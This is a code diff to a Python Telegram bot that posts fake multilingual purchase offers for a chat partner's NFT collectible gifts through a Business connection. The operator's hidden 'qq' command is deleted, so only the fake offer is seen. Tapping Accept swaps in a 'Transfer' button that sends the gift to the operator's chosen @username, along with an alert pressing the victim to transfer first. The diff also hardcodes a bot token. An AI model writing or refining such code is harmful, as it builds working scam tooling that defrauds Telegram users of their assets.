@@ -1,11 +1,12 @@
 import asyncio
 import random
 import logging
+import aiohttp
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions, BusinessConnection
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
+from aiogram.exceptions import TelegramRetryAfter
 
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
 
@@ -13,10 +14,9 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp  = Dispatcher(storage=MemoryStorage())
 
-message_queue  = asyncio.Queue()
-client_user_ids: dict[int, int]   = {}
-_bcid_store:    dict[str, dict]   = {}  # message_id (str) -> {bcid, chat_id, recipient, lang}
-_active_connections: dict[int, str] = {}  # user_id -> bcid (активные бизнес-соединения)
+message_queue:   asyncio.Queue = asyncio.Queue()
+client_user_ids: dict[int, int]  = {}
+_bcid_store:     dict[str, dict] = {}  # "chat_id:msg_id" -> {bcid, chat_id, recipient, lang}
 
 LOCALES = {
     "ru": {
@@ -26,7 +26,6 @@ LOCALES = {
         "btn_transfer":"Передать",
         "btn_confirm": "Подтвердить передачу",
         "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте позже.",
-        "set_ok":      "✅ Получатель установлен: @{username}",
     },
     "eng": {
         "offer_text":  'User offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer is valid for 5 h. 59 min..',
@@ -35,7 +34,6 @@ LOCALES = {
         "btn_transfer":"Transfer",
         "btn_confirm": "Confirm transfer",
         "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try later.",
-        "set_ok":      "✅ Recipient set: @{username}",
     },
     "ukr": {
         "offer_text":  'Користувач пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє протягом 5 год. 59 хв..',
@@ -44,7 +42,6 @@ LOCALES = {
         "btn_transfer":"Передати",
         "btn_confirm": "Підтвердити передачу",
         "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте пізніше.",
-        "set_ok":      "✅ Отримувача встановлено: @{username}",
     },
     "cn": {
         "offer_text":  '用户向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n此出价有效期为 5 小时 59 分钟。',
@@ -53,20 +50,26 @@ LOCALES = {
         "btn_transfer":"转移",
         "btn_confirm": "确认转移",
         "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。",
-        "set_ok":      "✅ 收件人已设置：@{username}",
     },
 }
 
 
-@dp.business_connection()
-async def business_connection_handler(bc: BusinessConnection):
-    """Следим за статусом бизнес-соединения, чтобы всегда знать актуальный bcid"""
-    if bc.is_enabled:
-        _active_connections[bc.user.id] = bc.id
-        logging.info(f"Business connection enabled for user {bc.user.id}: {bc.id}")
-    else:
-        _active_connections.pop(bc.user.id, None)
-        logging.info(f"Business connection disabled for user {bc.user.id}")
+async def delete_biz(bcid: str, message_ids: list) -> None:
+    url = f"https://api.telegram.org/bot{TOKEN}/deleteBusinessMessages"
+    for attempt in range(3):
+        async with aiohttp.ClientSession() as s:
+            r    = await s.post(url, json={"business_connection_id": bcid, "message_ids": message_ids})
+            data = await r.json()
+            if data.get("ok"):
+                return
+            desc = data.get("description", "")
+            if "retry after" in desc.lower():
+                wait = int(desc.split("retry after")[-1].strip()) + 1
+                logging.warning(f"delete flood, wait {wait}s")
+                await asyncio.sleep(wait)
+            else:
+                logging.warning(f"delete_biz: {desc}")
+                return
 
 
 def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
@@ -83,14 +86,14 @@ def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
 
 
 def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
-    loc      = LOCALES.get(lang, LOCALES["ru"])
-    slug     = gift_name.replace(" ", "")
-    cb_data  = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
+    loc     = LOCALES.get(lang, LOCALES["ru"])
+    slug    = gift_name.replace(" ", "")
+    cb_data = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
     return InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text=loc["btn_decline"], callback_data=f"d|{gift_num}",
-                           icon_custom_emoji_id="5778527486270770928"),
+                             icon_custom_emoji_id="5778527486270770928"),
         InlineKeyboardButton(text=loc["btn_accept"],  callback_data=cb_data,
-                           icon_custom_emoji_id="5776375003280838798"),
+                             icon_custom_emoji_id="5776375003280838798"),
     ]])
 
 
@@ -98,8 +101,8 @@ def make_accept_keyboard(lang, recipient):
     loc = LOCALES.get(lang, LOCALES["ru"])
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=loc["btn_transfer"],
-                             url=f"tg://send_gift?to={recipient}",
-                             icon_custom_emoji_id="5875180111744995604")],
+                              url=f"tg://send_gift?to={recipient}",
+                              icon_custom_emoji_id="5875180111744995604")],
         [InlineKeyboardButton(text=loc["btn_confirm"], callback_data="noop")],
     ])
 
@@ -113,16 +116,11 @@ async def handle_private(message: Message):
 async def handle_business_command(message: Message):
     if not message.text:
         return
-
     text_clean = message.text.strip()
     if not text_clean.lower().startswith("qq"):
         return
 
-    # Получаем bcid из сообщения или из общего словаря активных соединений
-    bcid = message.business_connection_id
-    if not bcid and message.from_user:
-        bcid = _active_connections.get(message.from_user.id)
-
+    bcid    = message.business_connection_id
     chat_id = message.chat.id
 
     if message.from_user:
@@ -136,7 +134,7 @@ async def handle_business_command(message: Message):
     if not raw_nft_part:
         return
 
-    text_lower = text_clean.lower()
+    text_lower    = text_clean.lower()
     currency_type = "gram" if "gram" in text_lower else "stars"
     currency_name = "Gram" if currency_type == "gram" else "Stars"
 
@@ -152,13 +150,12 @@ async def handle_business_command(message: Message):
             lang = l
             break
 
-    recipient = next((p.lstrip("@") for p in parts if p.startswith("@")), None)
-    if not recipient:
-        return
+    # @username в команде — получатель
+    recipient = next((p.lstrip("@") for p in parts if p.startswith("@")), "recipient_username")
 
     try:
-        clean_url    = raw_nft_part.split("?")[0].rstrip("/")
-        slug_part    = clean_url.split("/nft/")[-1]
+        clean_url = raw_nft_part.split("?")[0].rstrip("/")
+        slug_part = clean_url.split("/nft/")[-1]
         if "-" not in slug_part:
             return
         gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
@@ -169,25 +166,24 @@ async def handle_business_command(message: Message):
         return
 
     await message_queue.put({
-        "chat_id":        chat_id,
-        "gift_name":      gift_name,
-        "gift_num":       gift_num,
-        "amount":         amount,
-        "currency_type":  currency_type,
-        "currency_name":  currency_name,
-        "lang":           lang,
-        "bcid":           bcid,
-        "cmd_message_id": message.message_id,
-        "recipient":      recipient,
+        "chat_id":       chat_id,
+        "gift_name":     gift_name,
+        "gift_num":      gift_num,
+        "amount":        amount,
+        "currency_type": currency_type,
+        "currency_name": currency_name,
+        "lang":          lang,
+        "bcid":          bcid,
+        "cmd_message_id":message.message_id,
+        "recipient":     recipient,
     })
 
 
 @dp.callback_query(F.data.startswith("a|"))
 async def accept_offer(cb: CallbackQuery):
-    await cb.answer()
-
     parts = cb.data.split("|")
     if len(parts) < 6:
+        await cb.answer("Ошибка данных", show_alert=True)
         return
 
     _, slug, gift_num_str, amount, currency_type, lang = parts
@@ -202,67 +198,68 @@ async def accept_offer(cb: CallbackQuery):
         f"\u200B"
     )
 
+    cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    stored = _bcid_store.get(str(message_id))
 
-    # Надежно вытаскиваем bcid: из хранилища, из объекта или из активных подключений
-    bcid = None
-    if stored:
-        bcid = stored.get("bcid")
-    if not bcid:
-        bcid = getattr(cb.message, "business_connection_id", None)
-    if not bcid and cb.from_user:
-        bcid = _active_connections.get(cb.from_user.id)
+    # ищем по message_id — cb_chat_id может не совпадать с task chat_id
+    stored = None
+    for key, val in _bcid_store.items():
+        if key.endswith(f":{message_id}"):
+            stored = val
+            break
 
-    chat_id   = stored["chat_id"]   if stored else cb.message.chat.id
+    bcid      = stored["bcid"]      if stored else None
+    chat_id   = stored["chat_id"]   if stored else cb_chat_id
     recipient = stored["recipient"] if stored else "recipient_username"
     lang      = stored.get("lang", lang) if stored else lang
 
-    try:
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=make_accept_keyboard(lang, recipient),
-            business_connection_id=bcid,
-        )
-    except TelegramBadRequest as e:
-        if "message is not modified" in str(e).lower():
-            pass
-        else:
+    logging.warning(f"[accept] stored={stored} bcid={bcid} chat_id={chat_id} msg_id={message_id}")
+
+    await cb.answer("✅ Успешно принято!", show_alert=True)
+
+    for attempt in range(3):
+        try:
+            await bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=make_accept_keyboard(lang, recipient),
+                business_connection_id=bcid,
+            )
+            break
+        except TelegramRetryAfter as e:
+            wait = e.retry_after + 1
+            logging.warning(f"edit flood, wait {wait}s (attempt {attempt+1})")
+            await asyncio.sleep(wait)
+        except Exception as e:
+            if "message is not modified" in str(e):
+                break
             logging.error(f"accept edit error: {e}")
-    except Exception as e:
-        logging.error(f"accept edit error: {e}")
+            break
 
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
-    await cb.answer()
-    
+    cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    stored = _bcid_store.get(str(message_id))
-
-    bcid = None
-    if stored:
-        bcid = stored.get("bcid")
-    if not bcid:
-        bcid = getattr(cb.message, "business_connection_id", None)
-    if not bcid and cb.from_user:
-        bcid = _active_connections.get(cb.from_user.id)
-
+    stored     = None
+    for key, val in _bcid_store.items():
+        if key.endswith(f":{message_id}"):
+            stored = val
+            break
+    bcid = stored["bcid"] if stored else None
     try:
-        await bot.delete_business_messages(
-            business_connection_id=bcid,
-            message_ids=[message_id],
-        )
-    except Exception as e:
-        logging.error(f"decline delete error: {e}")
+        if bcid:
+            await delete_biz(bcid, [message_id])
+    except Exception:
+        pass
+    await cb.answer("Предложение отклонено")
 
 
 @dp.callback_query(F.data == "noop")
 async def noop_handler(cb: CallbackQuery):
-    await cb.answer()
+    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
 
 async def sender_worker():
@@ -270,14 +267,6 @@ async def sender_worker():
         task = await message_queue.get()
         try:
             await asyncio.sleep(random.uniform(0.5, 1.0))
-
-            # Проверяем, что bcid актуален
-            bcid = task["bcid"]
-            if not bcid and task.get("chat_id"):
-                # Пытаемся найти через общие соединения
-                uid = client_user_ids.get(task["chat_id"])
-                if uid:
-                    bcid = _active_connections.get(uid)
 
             text     = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
             keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
@@ -287,21 +276,18 @@ async def sender_worker():
                 text=text,
                 parse_mode=ParseMode.HTML,
                 reply_markup=keyboard,
-                business_connection_id=bcid,
+                business_connection_id=task["bcid"],
                 link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True),
             )
 
-            if bcid and sent_msg:
-                _bcid_store[str(sent_msg.message_id)] = {
-                    "bcid":      bcid,
+            if task["bcid"] and sent_msg:
+                _bcid_store[f"{task['chat_id']}:{sent_msg.message_id}"] = {
+                    "bcid":      task["bcid"],
                     "chat_id":   task["chat_id"],
                     "recipient": task["recipient"],
                     "lang":      task["lang"],
                 }
-                await bot.delete_business_messages(
-                    business_connection_id=bcid,
-                    message_ids=[task["cmd_message_id"]],
-                )
+                await delete_biz(task["bcid"], [task["cmd_message_id"]])
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
